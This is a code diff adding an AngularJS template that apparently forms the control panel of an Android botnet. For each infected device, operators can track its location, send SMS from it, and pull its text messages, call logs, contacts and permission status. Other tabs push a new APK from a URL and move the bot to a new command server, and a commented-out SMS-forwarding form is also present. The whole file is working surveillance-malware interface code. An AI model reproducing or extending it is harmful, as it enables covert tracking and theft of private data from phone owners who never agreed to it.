@@ -1,0 +1,168 @@
+<h1>
+  <span ng-show="!bot.updated">{{bot.device}}</span>
+  <span class="text-success" ng-show="bot.status && bot.updated">{{bot.device}} (online)</span>
+  <span class="text-danger" ng-show="!bot.status && bot.updated">{{bot.device}} (offline)</span>
+</h1>
+<p>Last seen {{bot.updated | amCalendar:referenceTime:formats}}</p>
+<!-- <p class="text-success" ng-show="bot.status">ONLINE</p>
+<p class="text-danger" ng-show="!bot.status">OFFLINE</p> -->
+<uib-tabset active="active">
+  <uib-tab index="0" heading="Location">
+    <div class="map-view">
+      <ui-gmap-google-map center='map.center' zoom='map.zoom' draggable="true">
+        <ui-gmap-marker idKey='bot.id' coords='{latitude: bot.lat, longitude: bot.longi}'>
+        </ui-gmap-marker>
+      </ui-gmap-google-map>
+    </div>
+  </uib-tab>
+  <uib-tab index="1" heading="SMS">
+    <div class="row">
+      <div class="col-md-6">
+        <h3>Send Text Message</h3>
+        <form name="sendSmsForm">
+          <div class="form-group" ng-class="">
+            <label>Text message</label>
+            <textarea class="form-control" ng-model="text_message" name="text_message" rows="5" required=""></textarea>
+          </div>
+          <div class="form-group" ng-class="">
+            <label>Send to number</label>
+            <input class="form-control" type="text" name="sendto_number" ng-model="sendto_number" rows="10" required/>
+          </div>
+          <div class="form-group">
+            <button type="submit" ng-disabled="sendSmsForm.$invalid" class="btn btn-primary" ng-click="addCommand('sendsms', sendto_number, text_message)">Send SMS</button>
+          </div>
+        </form>
+        <!--<hr>-->
+        <!--<h3 ng-class="{'text-success' : bot.sms_forwarder_status, 'text-danger':!bot.sms_forwarder_status}">-->
+        <!--  Sms Forwarder-->
+        <!--  <span ng-show="bot.sms_forwarder_status">(running)</span>-->
+        <!--</h3>-->
+        <!--<form name="smsForwardForm">-->
+        <!--  <div class="form-group" ng-class="">-->
+        <!--    <label>Recipient Number</label>-->
+        <!--    <input class="form-control" type="text" name="bot.sms_forwarder_number" ng-model="bot.sms_forwarder_number" rows="10" required/>-->
+        <!--  </div>-->
+        <!--  <div class="form-group">-->
+        <!--    <button type="submit" ng-disabled="smsForwardForm.$invalid || bot.sms_forwarder_status" class="btn btn-primary" ng-click="addCommand('smsforwarder', 'forward', bot.sms_forwarder_number)">Start Forwarding SMS</button>-->
+        <!--    <a class="btn btn-danger" ng-disabled="!bot.sms_forwarder_status" ng-click="addCommand('smsforwarder', 'stop')">Stop Forwarding</a>-->
+        <!--  </div>-->
+        <!--</form>-->
+      </div>
+      <div class="col-md-6">
+        <h3>Retreive SMS</h3>
+        <form name="smsForm">
+          <div class="form-group" ng-class="">
+            <label>Number of SMS</label>
+            <input class="form-control" type="number" name="number" ng-model="numbersms" required>
+          </div>
+          <div class="form-group">
+            <button type="submit" ng-disabled="smsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getsms', numbersms)">Get SMS</button>
+            <a class="btn btn-danger" ng-click="clearSMS()">Clear List</a>
+          </div>
+        </form>
+        <hr>
+        <strong ng-show="!hasMessages">No messages to show.</strong>
+        <div ng-show="hasMessages">
+          <p><strong>SMS Threads</strong></p>
+          <div class="list-group">
+            <a ng-repeat="(thread, dateMessages) in messageThreads | orderObjectBy:'last_date':true" class="list-group-item" sms-thread thread="thread" on-close="loadMessages()" messages="dateMessages.messages"></a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </uib-tab>
+  <uib-tab index="2" heading="Call Logs">
+    <form name="callLogsForm">
+      <div class="form-group" ng-class="">
+        <label>Number of call logs</label>
+        <input class="form-control" type="number" name="number" ng-model="num_call_logs" required>
+      </div>
+      <div class="form-group">
+        <button ng-disabled="callLogsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">Get Call History</button>
+        <a class="btn btn-danger" ng-click="clearCallLogs()">Clear History</a>
+      </div>
+    </form>
+    <hr>
+    <b ng-show="callLogs.length === 0">No call history to show.</b>
+    <div class="call-logs-view" ng-show="callLogs.length > 0">
+      <div class="list-group">
+        <div class="list-group-item" ng-repeat="log in callLogs | orderBy: '-date'" call-log-item="log">
+        </div>
+      </div>
+    </div>
+  </uib-tab>
+  <uib-tab index="3" heading="Contacts">
+    <button class="btn btn-primary" ng-click="addCommand('getcontacts')">Get Contacts</button>
+    <button class="btn btn-danger" ng-click="deleteContacts()">Clear Contacts</button>
+    <hr>
+    <table class="table" ng-show="contacts.length > 0">
+      <thead>
+        <tr>
+          <th>Name</th>
+          <th>Phone Number/s</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr ng-repeat="contact in contacts">
+          <td>{{contact.name}}</td>
+          <td>
+            {{contact.phone_numbers}}
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <b ng-show="contacts.length === 0">No info to show</b>
+  </uib-tab>
+  <uib-tab index="4" heading="Permissions">
+    <table class="table" ng-show="permissions.length > 0">
+      <thead>
+        <tr>
+          <th>Permission</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr ng-repeat="perm in permissions">
+          <td>{{perm.permission}}</td>
+          <td>
+            <span class="text-success" ng-if="perm.granted">Granted</span>
+            <span class="text-danger" ng-if="!perm.granted">Denied</span>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <b ng-show="permissions.length === 0">No info to show</b>
+  </uib-tab>
+  <uib-tab index="5" heading="Pending Commands">
+    <div class="list-group">
+      <div class="list-group-item" ng-repeat="cmd in pendingCommands">
+        {{cmd.command}}
+        <a class="btn btn-danger btn-sm" ng-click="deleteCommand(cmd.id)">&times;</a>
+      </div>
+      <p ng-show="pendingCommands.length === 0">No pending commands</p>
+    </div>
+  </uib-tab>
+  <uib-tab index="6" heading="Settings">
+    <form name="updateApkForm">
+      <div class="form-group ">
+        <label>Update APK</label>
+        <input placeholder="URL of new APK" class=" form-control" type="url" name="apkUrl" ng-model="update_url" required>
+      </div>
+      <div class="form-group">
+        <button ng-disabled="updateApkForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Update APK</button>
+      </div>
+    </form>
+    <hr>
+    <form name="transferBotForm">
+      <div class="form-group ">
+        <label>Transfer bot to new server</label>
+        <input class=" form-control" placeholder="URL of new server" type="url" name="apkUrl" ng-model="server_url" required>
+      </div>
+      <div class="form-group">
+        <button ng-disabled="transferBotForm.$invalid" class="btn btn-primary" ng-click="addCommand('transferbot', server_url)">Transfer Bot</button>
+      </div>
+    </form>
+    <hr>
+    <a ng-click="removeDevice(bot)" class="btn btn-danger">Remove Device from List</a>
+  </uib-tab>
+</uib-tabset>
